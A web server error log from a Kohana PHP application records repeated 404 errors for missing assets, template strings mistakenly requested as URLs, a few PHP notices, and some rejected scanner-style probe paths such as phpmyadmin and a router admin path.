#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Main_Login.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Main_Login.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cap.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cap.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:51 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 13:20:51 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 13:20:55 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 13:20:55 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 13:28:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:28:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:28:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:28:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:28:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:28:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:28:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:28:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:29:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js-170518/{path} was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:29:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js-170518/{path} was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:29:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/02.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:29:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/02.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:29:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/03.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:29:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/03.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:30:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/04.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:30:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/04.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:30:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/05.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:30:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/05.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:30:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/01.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:30:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/easyslider/images/01.jpg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:31:06 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js-170518/"+img_src+" was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:31:06 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js-170518/"+img_src+" was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:31:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/jquery.min.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:31:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/jquery.min.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:36:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.woff2 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:36:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/fonts/glyphicons-halflings-regular.woff2 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:36:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/+a.getUrl(w.icon)+ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:36:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/+a.getUrl(w.icon)+ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:36:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/'+IMGPATH+'/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:36:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/'+IMGPATH+'/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:36:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void('",o.more,"')/"",' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:36:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void('",o.more,"')/"",' ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:37:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/datepicker/jquery.timepicker.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:37:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/datepicker/jquery.timepicker.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:37:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void('",o.auto,'/')" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:37:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void('",o.auto,'/')" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:39:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js-170518/'+URL_BASE+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:39:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js-170518/'+URL_BASE+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:55:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/" + b[d.link] + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:55:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/" + b[d.link] + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:55:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/" + d.link(b) + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:55:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/" + d.link(b) + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 14:00:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/'+this.hostname+'/public/images/arrow2.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 14:00:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/'+this.hostname+'/public/images/arrow2.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 14:02:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaTextbookLTRoman/fontsmoothie.min.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 14:02:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaTextbookLTRoman/fontsmoothie.min.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 14:03:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/,a.getUrl(this.icon), ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 14:03:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/,a.getUrl(this.icon), ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 14:11:53 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js-170518/+ path + was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 14:11:53 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js-170518/+ path + was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 14:15:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/jquery.min.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 14:15:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/jquery.min.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 14:16:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/'+g+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 14:16:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/'+g+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 14:16:18 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/'+v+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 14:16:18 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/ckeditor/'+v+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 14:16:55 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js/angular/"+image_url+" was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 14:16:55 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js/angular/"+image_url+" was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 14:43:24 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 14:43:24 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 14:59:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL portal/redlion was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 14:59:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL portal/redlion was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 15:02:20 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL phpmyadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 15:02:20 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL phpmyadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 15:02:25 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL phpmyadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 15:02:25 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL phpmyadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 15:04:33 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-24 15:04:33 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-24 15:16:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 15:16:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 16:03:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/" + b[d.link] + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 16:03:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/" + b[d.link] + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 16:03:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/" + d.link(b) + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 16:03:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/" + d.link(b) + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 16:22:51 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js/'+URL_BASE+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 16:22:51 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js/'+URL_BASE+' was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 16:23:02 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js/"+img_src+" was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 16:23:02 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js/"+img_src+" was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 16:23:03 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js/{path} was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 16:23:03 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js/{path} was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 16:29:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/" + b[d.iconSrc] + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 16:29:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/" + b[d.iconSrc] + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 16:29:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/" + d.iconSrc(b) + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 16:29:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/" + d.iconSrc(b) + " ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 16:29:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void(0);/" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 16:29:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: "javascript:void(0);/" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 16:44:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/angular.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 16:44:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/angular.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 16:45:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/angular-aria.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 16:45:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/angular-aria.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:00:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:00:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:01:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/angular-animate.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:01:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/angular-animate.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:01:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/socket.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:01:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/socket.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:02:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/angular-messages.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:02:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/angular/plugins/angular-messages.min.js.map ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/animated-overlay.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/animated-overlay.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_flat_0_aaaaaa_40x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_flat_0_aaaaaa_40x100.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_95_fef1ec_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_95_fef1ec_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 17:03:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_75_dadada_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 17:03:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/datetimepicker/images/ui-bg_glass_75_dadada_1x400.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
